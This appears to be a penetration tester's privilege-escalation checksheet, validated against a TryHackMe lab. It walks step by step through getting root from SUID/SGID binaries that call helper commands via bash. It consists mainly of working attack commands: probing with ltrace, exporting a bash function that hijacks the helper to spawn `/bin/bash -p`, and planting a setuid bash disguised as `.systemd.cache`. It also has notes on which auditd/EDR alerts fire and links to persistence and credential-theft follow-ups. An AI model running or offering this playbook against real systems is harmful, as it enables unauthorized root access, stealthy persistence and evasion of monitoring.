
⚠️ **Hard preconditions — verified in Step 1.**

- **A SUID/SGID binary invokes a helper command through a bash shell.** Verified per-candidate in Step 2.
- **Operator shell is bash.** Verified in Step 1. 
- **Target bash accepts the candidate's command form as an exported function name.** Bare-name → any bash. Slashed-name (absolute-path) → pre-4.2-048 only. Verified by the slashed-name probe. Verified in Step 1. 
- **`<binary>` is SUID-root for full root.** SGID-only → effective group only, see [[#SGID candidates]].
- **For piped-stdio invocations** (e.g. `popen()`): a writable+executable directory is required. Verified in Step 3.

---

## Step 1 — Preflight

##### Operator shell is bash:

`echo $BASH_VERSION`

- Output is a version string (e.g. `5.2.21(1)-release`) → in bash; proceed.
- Empty / no output → not in bash. Run `/bin/bash`, re-run.

##### Slashed-name export probe (pre-4.2-048 gate):

`function /tmp/foo { :; } && export -f /tmp/foo; unset -f /tmp/foo 2>/dev/null`

- Silent → `<slashed_ok>` = yes (patch 4.2-048 not applied).
- `cannot export` → `<slashed_ok>` = no (patch applied).

`<slashed_ok>` gates slashed-name candidate filtering at Step 2.

---

## Step 2 — Self-select a candidate

⚠️ Candidate list = the SUID/SGID `find` output from [[Linux Privilege Escalation Checksheet]] Step 8. If absent, return there first.

⚠️ **exec-family** below = `execve` / `execl` / `execv` / `execlp` / `execvp`.

For each candidate `<binary>`, reveal any helper invocation:

`timeout 10 ltrace -f <binary> </dev/null 2>&1 | grep -oE '(system|popen|execve|execl|execv|execlp|execvp)\("[^"]+"'`

(no `ltrace` → **No fallback method yet built, both `strace` and `strings` presented severe limitations** — build canonical fallback when encountered (HTB, PG etc.))

Map the hit to the appropriate invocation strategy (function call) below; either A, B, C or D (e.g. hit is `system("service apache2 start"`, follow path `A`, `system()`): 

##### A. `system()` or `popen()`

Confirm `/bin/sh` is bash:

`/bin/sh -c 'echo ${BASH_VERSION:-not-bash}'`

- Bash version string → proceed.
- `not-bash` → `/bin/sh` is dash/ash; strips `BASH_FUNC_*%%` env vars during inheritance. Skip this hit → next candidate.

**Record the following variables:**

`<inv>` = `system` or `popen` (matching the call).

`<cmd>` = first whitespace-delimited token of the quoted string argument (e.g. for the output `system("service apache2 start"`, `<cmd>` = `service`; for the output `system("/usr/sbin/service apache2 start"`, `<cmd>` = `/usr/sbin/service`).

**Viability check:**

- `<cmd>` starts with `/` (slashed): 
	- `<slashed_ok>` = `yes` → proceed to Step 3. 
	- `<slashed_ok>` = `no` → skip this hit → next candidate. 
- `<cmd>` is bare-name:
	- always viable → proceed to Step 3.

##### B. exec-family on `/bin/sh` or PATH-resolved `"sh"`

Patterns: `execve("/bin/sh", ...)`, `execl`, `execv` on `/bin/sh`; `execlp("sh", ...)`, `execvp("sh", ...)` (the `p` variants PATH-resolve `"sh"` to `/bin/sh`).

Confirm `/bin/sh` is bash:

`/bin/sh -c 'echo ${BASH_VERSION:-not-bash}'`

- Bash version string → proceed.
- `not-bash` → `/bin/sh` is dash/ash; strips `BASH_FUNC_*%%` env vars during inheritance. Skip this hit → next candidate.

**Record the following variables:**

`<inv>` = `exec-sh`

`<cmd>` = first whitespace-delimited token of the bash `-c` argument (e.g. for the output `execve("/bin/sh", ["sh", "-c", "service apache2 start"], ...)`, the `-c` argument is `"service apache2 start"`, so `<cmd>` = `service`).

⚠️ Edge: exec-family on `/bin/sh` running a script (no `-c`) — `<cmd>` is inside the script; out of canonical scope.

**Viability check:**

- `<cmd>` starts with `/` (slashed): 
	- `<slashed_ok>` = `yes` → proceed to Step 3. 
	- `<slashed_ok>` = `no` → skip this hit → next candidate. 
- `<cmd>` is bare-name:
	- always viable → proceed to Step 3.

##### C. exec-family on `/bin/bash` or PATH-resolved `"bash"`

Patterns: `execve("/bin/bash", ...)`, `execl`, `execv` on `/bin/bash`; `execlp("bash", ...)`, `execvp("bash", ...)` (the `p` variants PATH-resolve `"bash"` to `/bin/bash`).

**Record the following variables:**

`<inv>` = `exec-bash`

`<cmd>` = first whitespace-delimited token of bash's `-c` argument (e.g. for the output `execve("/bin/bash", ["bash", "-c", "service apache2 start"], ...)`, the `-c` argument is `"service apache2 start"`, so `<cmd>` = `service`).

⚠️ Edge: exec-family on `/bin/bash` running a script (no `-c`) — `<cmd>` is inside the script; out of canonical scope.

**Viability check:**

- `<cmd>` starts with `/` (slashed): 
	- `<slashed_ok>` = `yes` → proceed to Step 3. 
	- `<slashed_ok>` = `no` → skip this hit → next candidate. 
- `<cmd>` is bare-name:
	- always viable → proceed to Step 3.

##### D. exec-family on anything else

Skip — this technique requires bash to be the spawned shell → next candidate.

## Step 3 — Trigger + verify

Branch on `<inv>`:
##### `<inv>` ∈ {`system`, `exec-sh`, `exec-bash`} → inline-spawn (no disk artefact; drop-and-launch fallback if stdio broken)

Define and export a function whose name is exactly `<cmd>`:

`function <cmd> { /bin/bash -p; }; export -f <cmd>`

Trigger:

`<binary>`

Verify:

`id`

- `uid=0(root)` or `euid=0(root)` → root achieved → [Decision](#Decision).
- Shell did not spawn / binary ran the legitimate `<cmd>` and returned → environment was sanitised by the binary, or the ltrace hit was misread. Re-verify `<inv>` and `<cmd>` → next candidate → Step 2. 
- Shell spawned but stdio garbled / no echo / immediate exit → stdio is piped (popen-like) or binary redirected fds before invoking the shell. Fall back to drop-and-launch technique: 
	- in **operator** bash, `unset -f <cmd>`
	- then follow the [[#`<inv>` == `popen` → drop-and-launch (setuid bash on disk)|`<inv>` == `popen` branch]] below.
- SGID binary → see [[#SGID candidates]].

##### `<inv>` == `popen` → drop-and-launch (setuid bash on disk)

`popen()` pipes child stdio — inline-spawn surfaces no usable terminal. Drop a setuid-bash, launch from operator terminal.

⚠️ **High-IOC.** `chmod 4755` on a fresh file in `<drop_dir>` triggers auditd / FIM / EDR alerts in real-time. Cleanup at end doesn't undo the alert.

Probe for a writable+executable drop directory `<drop_dir>`:

`d=/tmp; printf '#!/bin/sh\ntrue\n' > "$d/.p" && chmod +x "$d/.p" && "$d/.p" && echo "EXEC OK" ; rm -f "$d/.p"`

- `EXEC OK` → `<drop_dir>` = `/tmp`. Proceed.
- No output → set `d=/dev/shm`, then `d=/var/tmp`, then `d="$HOME"` and re-run (**one at a time**); first that prints `EXEC OK` is `<drop_dir>`.
- None → no drop site → next candidate → Step 2.

`function <cmd> { cp /bin/bash <drop_dir>/.systemd.cache && chmod 4755 <drop_dir>/.systemd.cache; }; export -f <cmd>`

`<binary>`

`<drop_dir>/.systemd.cache -p`

`id`

- `uid=0(root)` or `euid=0(root)` → root achieved → [Decision](#Decision).
- `<drop_dir>/.systemd.cache` absent → function not invoked → next candidate → Step 2.
- File present but not setuid-root → `<binary>` isn't actually SUID-root → next candidate → Step 2.
- SGID binary → see [[#SGID candidates]].

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction → [[Linux Credential Extraction Checksheet]]
- Persistence → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

---

## Cleanup

Two sub-cases by what was used.

##### Inline-spawn — no disk artefact

From the root shell:

`exit`

In operator bash:

`unset -f <cmd>`

⚠️ The exported function is bash-process state in your operator shell; doesn't persist to new sessions. `unset -f` is hygiene, not requirement.

##### Drop-and-launch — setuid bash on `<drop_dir>`

From the root shell, before exit (the setuid copy is root-owned — your normal user can't delete it under a sticky `/tmp`):

`rm -f <drop_dir>/.systemd.cache`

`exit`

In operator bash:

`unset -f <cmd>`

⚠️ The setuid bash launch may be recorded by auditd / process accounting (`pacct`); the setuid-root file may trip FIM. Log cleanup is out of scope.

---

## SGID candidates

For an SGID (not SUID) binary, the function runs with `egid=<group>`, not `euid=0`. `setuid(0)` returns `-1` (no saved root to reclaim); the win is the effective group, which `/bin/bash -p` preserves into the spawned shell.

##### Inline-spawn (any `<inv>`)

Function body unchanged — `/bin/bash -p` preserves `egid`:

`function <cmd> { /bin/bash -p; }; export -f <cmd>`

Verify: `id` shows `egid=<group>` (not `euid=0`).

##### Drop-and-launch (any `<inv>`)

Drop a setgid (not setuid) bash — `chmod 2755`, not `4755`:

`function <cmd> { cp /bin/bash <drop_dir>/.systemd.cache && chmod 2755 <drop_dir>/.systemd.cache; }; export -f <cmd>`

Launch with `-p` and verify `egid=<group>`.

- No `egid` change → binary drops the setgid privilege before exec; abandon → next candidate.
- Exploit per the group: e.g. `shadow` → [[Readable Shadow]]; `disk` / `docker` → matching group-escalation route.

---

## Validation

THM:Linux PrivEsc:Task 14 SUID / SGID Executables — Abusing Shell Features (#1)